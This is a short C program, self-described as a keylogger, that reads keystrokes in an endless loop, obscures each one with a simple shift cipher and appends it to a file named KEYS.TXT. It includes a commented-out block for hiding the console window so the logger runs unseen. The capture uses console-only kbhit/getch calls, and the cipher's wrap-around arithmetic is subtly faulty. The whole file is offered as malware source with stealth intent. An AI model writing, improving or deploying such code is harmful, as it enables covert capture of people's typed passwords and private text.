	# include <stdio.h>
	# include <conio.h>
	# include <windows.h>
	# include <winuser.h>
	# include <iostream>
	
	int main ( void )
	{	//Data Initialization For Keylogger/////////////// 
		int cha;
		char ch;
		FILE *fptr;
		
		//Data and Dictionary for Encryption///////////////
		char dictionary[] ={ '\0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm','n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
	  	char dictionary1[] ={ '\0', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M','N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
	  	char dictionarynum[] ={ '\0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
	  	char dictionarysym[] ={ '\0', '!', '\"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', '-', '.','/', ':', ';', '<', '=', '>', '?', '@', '\[', '\\', ']', '^', '_', '`', '{', '|', '}', '~' };
	  	int k = 0;
	  	int n = 5; 
	  	char x;
	  	char x1;
	  	char spaceman= ' ';
	  	////////////////////////////////////////////////////
	  	
	  	//For Hiding Keylogger///////////////////////////
		//HWND stealth; /*creating stealth (window is not visible)*/
		//AllocConsole();
		//stealth=FindWindowA("ConsoleWindowClass",NULL);
		//ShowWindow(stealth,0);
		/////////////////////////////////////////////////
		
		//Loop for Keylogger///////////////////////////////
		while(1)
		{
			if ( kbhit() )
			{
				ch = getch();
				x = ch;
				cha = ch;
				fptr = fopen("KEYS.TXT", "a+");
				k = 0;
				if(	ch == spaceman)
	      		{
	      			fputc(x,fptr);
	      			fclose(fptr);
				}
				else
				{
					for (int i = 1; i < 27; i++)
					{	
					
			  			if (dictionary[i] == x)
			    		{
			    	  		if ((i + n) > 26)
					  		{	
				  				x1=  dictionary[(i + n) % 26];
				 				k = k + 1;
							}
			      			else
							{
				  				x1= dictionary[(i + n)];
				  				k = k + 1;
							}
			    		}
			  			else if (dictionary1[i] == x)
			    		{
			      			if ((i + n) > 26)
							{
				  				x1= dictionary1[(i + n) % 26];
				  				k = k + 1;
							}
			      			else
							{
				  				x1= dictionary1[(i + n)];
				  				k = k + 1;
							}
			    		}
					}
		
		      		for (int i = 0; i < 10; i++)
					{
			  			if (dictionarynum[i] == x)
			    		{
			      			if ((i + n) > 9)
							{
				  				x1= dictionarynum[(i + n) % 9];
				  				k = k + 1;
							}
			      			else
							{
				  				x1= dictionarynum[(i + n)];
				  				k = k + 1;
							}
			   			}
					}
					
		      		for (int i = 1; i < 33; i++)
					{
			  			if (dictionarysym[i] == x)
			    		{
			      			if ((i + n) > 32)
							{
				  				x1= dictionarysym[(i + n) % 32];
				  				k = k + 1;
							}
			      			else
							{
				  				x1= dictionarysym[(i + n)];
				  				k = k + 1;
							}
			    		}
			    	}
			    	fputc(x1,fptr);
					fclose(fptr);
				}
				if ( cha == 27)
				{
					return 0;
				}	
			}
		}
	}
